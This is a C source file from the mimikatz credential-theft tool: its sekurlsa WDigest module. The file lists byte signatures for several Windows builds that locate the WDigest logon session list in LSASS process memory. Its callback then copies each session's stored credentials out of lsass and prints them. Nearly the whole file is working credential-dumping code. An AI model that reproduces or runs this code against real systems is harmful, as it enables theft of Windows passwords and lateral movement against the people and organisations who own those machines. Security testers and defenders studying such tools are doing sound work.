/*	Benjamin DELPY `gentilkiwi`
	http://blog.gentilkiwi.com
	benjamin@gentilkiwi.com
	Licence : https://creativecommons.org/licenses/by/4.0/
*/
#include "kuhl_m_sekurlsa_wdigest.h"
#ifdef _M_X64
BYTE PTRN_WIN5_PasswdSet[]	= {0x48, 0x3b, 0xda, 0x74};
BYTE PTRN_WIN6_PasswdSet[]	= {0x48, 0x3b, 0xd9, 0x74};
KULL_M_PATCH_GENERIC WDigestReferences[] = {
	{KULL_M_WIN_BUILD_XP,		{sizeof(PTRN_WIN5_PasswdSet),	PTRN_WIN5_PasswdSet},	{0, NULL}, {-4, 36}},
	{KULL_M_WIN_BUILD_2K3,		{sizeof(PTRN_WIN5_PasswdSet),	PTRN_WIN5_PasswdSet},	{0, NULL}, {-4, 48}},
	{KULL_M_WIN_BUILD_VISTA,	{sizeof(PTRN_WIN6_PasswdSet),	PTRN_WIN6_PasswdSet},	{0, NULL}, {-4, 48}},
};
#elif defined _M_IX86
BYTE PTRN_WIN5_PasswdSet[]	= {0x74, 0x18, 0x8b, 0x4d, 0x08, 0x8b, 0x11};
BYTE PTRN_WIN6_PasswdSet[]	= {0x74, 0x11, 0x8b, 0x0b, 0x39, 0x4e, 0x10};
BYTE PTRN_WIN63_PasswdSet[]	= {0x74, 0x15, 0x8b, 0x0a, 0x39, 0x4e, 0x10};
BYTE PTRN_WIN64_PasswdSet[]	= {0x74, 0x15, 0x8b, 0x0f, 0x39, 0x4e, 0x10};
BYTE PTRN_WIN1809_PasswdSet[] = {0x74, 0x15, 0x8b, 0x17, 0x39, 0x56, 0x10};
KULL_M_PATCH_GENERIC WDigestReferences[] = {
	{KULL_M_WIN_BUILD_XP,		{sizeof(PTRN_WIN5_PasswdSet),	PTRN_WIN5_PasswdSet},	{0, NULL}, {-6, 36}},
	{KULL_M_WIN_BUILD_2K3,		{sizeof(PTRN_WIN5_PasswdSet),	PTRN_WIN5_PasswdSet},	{0, NULL}, {-6, 28}},
	{KULL_M_WIN_BUILD_VISTA,	{sizeof(PTRN_WIN6_PasswdSet),	PTRN_WIN6_PasswdSet},	{0, NULL}, {-6, 32}},
	{KULL_M_WIN_MIN_BUILD_BLUE,	{sizeof(PTRN_WIN63_PasswdSet),	PTRN_WIN63_PasswdSet},	{0, NULL}, {-4, 32}},
	{KULL_M_WIN_MIN_BUILD_10,	{sizeof(PTRN_WIN64_PasswdSet),	PTRN_WIN64_PasswdSet},	{0, NULL}, {-6, 32}},
	{KULL_M_WIN_BUILD_10_1809,	{sizeof(PTRN_WIN1809_PasswdSet),	PTRN_WIN1809_PasswdSet},	{0, NULL}, {-6, 32}},
};
#endif

PKIWI_WDIGEST_LIST_ENTRY l_LogSessList = NULL;
LONG offsetWDigestPrimary = 0;

KUHL_M_SEKURLSA_PACKAGE kuhl_m_sekurlsa_wdigest_package = {L"wdigest", kuhl_m_sekurlsa_enum_logon_callback_wdigest, TRUE, L"wdigest.dll", {{{NULL, NULL}, 0, 0, NULL}, FALSE, FALSE}};
const PKUHL_M_SEKURLSA_PACKAGE kuhl_m_sekurlsa_wdigest_single_package[] = {&kuhl_m_sekurlsa_wdigest_package};

NTSTATUS kuhl_m_sekurlsa_wdigest(int argc, wchar_t * argv[])
{
	return kuhl_m_sekurlsa_getLogonData(kuhl_m_sekurlsa_wdigest_single_package, 1);
}

void CALLBACK kuhl_m_sekurlsa_enum_logon_callback_wdigest(IN PKIWI_BASIC_SECURITY_LOGON_SESSION_DATA pData)
{
	KULL_M_MEMORY_ADDRESS aLocalMemory = {NULL, &KULL_M_MEMORY_GLOBAL_OWN_HANDLE}, aLsassMemory = {NULL, pData->cLsass->hLsassMem};
	SIZE_T taille;
	
	if(kuhl_m_sekurlsa_wdigest_package.Module.isInit || kuhl_m_sekurlsa_utils_search_generic(pData->cLsass, &kuhl_m_sekurlsa_wdigest_package.Module, WDigestReferences, ARRAYSIZE(WDigestReferences), (PVOID *) &l_LogSessList, NULL, NULL, &offsetWDigestPrimary))
	{
		aLsassMemory.address = l_LogSessList;
		taille = offsetWDigestPrimary + sizeof(KIWI_GENERIC_PRIMARY_CREDENTIAL);
		if(aLsassMemory.address = kuhl_m_sekurlsa_utils_pFromLinkedListByLuid(&aLsassMemory, FIELD_OFFSET(KIWI_WDIGEST_LIST_ENTRY, LocallyUniqueIdentifier), pData->LogonId))
		{
			if(aLocalMemory.address = LocalAlloc(LPTR, taille))
			{
				if(kull_m_memory_copy(&aLocalMemory, &aLsassMemory, taille))
					kuhl_m_sekurlsa_genericCredsOutput((PKIWI_GENERIC_PRIMARY_CREDENTIAL) ((PBYTE) aLocalMemory.address + offsetWDigestPrimary), pData, 0);
				LocalFree(aLocalMemory.address);
			}
		}
	} else kprintf(L"KO");
}